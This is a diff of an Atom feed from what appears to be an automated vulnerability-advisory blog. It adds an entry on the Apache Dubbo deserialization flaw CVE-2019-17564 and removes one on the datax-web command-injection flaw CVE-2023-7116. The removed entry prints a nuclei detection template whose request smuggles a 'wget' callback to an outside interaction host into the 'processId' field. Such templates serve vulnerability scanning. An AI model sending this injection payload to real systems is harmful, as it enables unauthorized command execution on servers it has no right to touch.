@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-21T01:45:27.467Z</updated>
+  <updated>2025-06-21T02:30:15.037Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache Dubbo 反序列化漏洞</title>
+    <link href="http://example.com/2025/06/21/github_3489987082/"/>
+    <id>http://example.com/2025/06/21/github_3489987082/</id>
+    <published>2025-06-21T02:30:15.042Z</published>
+    <updated>2025-06-21T02:30:15.037Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Dubbo 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-17564</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache Dubbo 2.7.0至2.7.4、2.6.0至2.6.7以及所有2.5.x版本中存在反序列化漏洞，由于在HTTP POST请求中接受不受信任的Java对象，攻击者可以完全控制Provider实例（如果启用了HTTP），利用此漏洞需要攻击者发送恶意的Java对象。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Dubbo</p><p><strong>影响版本：</strong> 2.5.x, 2.6.0 &lt;&#x3D; version &lt;&#x3D; 2.6.7, 2.7.0 &lt;&#x3D; version &lt;&#x3D; 2.7.4</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12444">https://github.com/projectdiscovery/nuclei-templates/issues/12444</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Apache Dubbo versions 2.7.0 to 2.7.4, 2.6.0 to 2.6.7, and all 2.5.x versions contain an insecure deserialization caused by accepting untrusted Java objects in HTTP POST requests, letting attackers fully compromise a Provider instance if HTTP is enabled, exploit requires attacker to send malicious Java object.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/fairyming/CVE-2019-17564">https://github.com/fairyming/CVE-2019-17564</a></li><li><a href="https://github.com/Dor-Tumarkin/CVE-2019-17564-FastJson-Gadget">https://github.com/Dor-Tumarkin/CVE-2019-17564-FastJson-Gadget</a></li><li><a href="https://github.com/Exploit-3389/CVE-2019-17564">https://github.com/Exploit-3389/CVE-2019-17564</a></li><li><a href="https://github.com/Hu3sky/CVE-2019-17564">https://github.com/Hu3sky/CVE-2019-17564</a></li><li><a href="https://github.com/Jaky5155/CVE-2019-17564">https://github.com/Jaky5155/CVE-2019-17564</a></li><li><a href="https://github.com/r00t4dm/CVE-2019-17564">https://github.com/r00t4dm/CVE-2019-17564</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-NA"><a href="#Shodan-Query-NA" class="headerlink" title="Shodan Query: NA"></a>Shodan Query: <code>NA</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache Dubbo 反序列化漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
   
   <entry>
     <title>Microsoft SharePoint 远程代码执行漏洞</title>
@@ -523,33 +550,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WeiYe-Jing datax-web 命令执行漏洞</title>
-    <link href="http://example.com/2025/06/20/github_1640594275/"/>
-    <id>http://example.com/2025/06/20/github_1640594275/</id>
-    <published>2025-06-20T12:45:15.087Z</published>
-    <updated>2025-06-20T12:45:15.083Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WeiYe-Jing datax-web 命令执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-7116</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> WeiYe-Jing datax-web 2.1.2版本中存在一个操作系统命令注入漏洞，该漏洞由于&#x2F;api&#x2F;log&#x2F;killJob端点中的’processId’参数未经过适当的清理，导致远程攻击者可以在受影响的系统上执行任意命令。</p><p><strong>产品厂商：</strong> WeiYe-Jing</p><p><strong>产品名称：</strong> datax-web</p><p><strong>影响版本：</strong> 2.1.2</p><p><strong>搜索语法：</strong> app&#x3D;”WeiYe-Jing-datax-web”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/239153bb48fc35eeedeb44e1a6fb9fec275af810/http%2Fcves%2F2023%2FCVE-2023-7116.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/239153bb48fc35eeedeb44e1a6fb9fec275af810/http%2Fcves%2F2023%2FCVE-2023-7116.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">7116</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> WeiYe-Jing datax-web <span class="hljs-operator">-</span> OS Command Injection<br>  <span class="hljs-params">author:</span> pussycat0x<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    WeiYe-Jing datax-web <span class="hljs-number">2.1</span>.<span class="hljs-number">2</span> contains an OS command injection vulnerability caused by improper sanitization of the &#x27;processId&#x27; parameter <span class="hljs-keyword">in</span> the <span class="hljs-symbol">/api/log/killJob</span> endpoint. This allows remote attackers to execute arbitrary commands on the affected system.<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">shodan-query:</span> <span class="hljs-string">&quot;app=<span class="hljs-char escape_">\&quot;</span>WeiYe-Jing-datax-web<span class="hljs-char escape_">\&quot;</span>&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2023,rce,datax-web,oast,injection,unauth<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;title&gt;Datax Web&quot;</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/api/log/killJob</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Accept:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<span class="hljs-string">&quot;processId&quot;</span>:<span class="hljs-string">&quot;1 &amp; wget http://&#123;&#123;interactsh-url&#125;&#125;&quot;</span>&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> interactsh_protocol<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;http&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WeiYe-Jing datax-web 命令执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
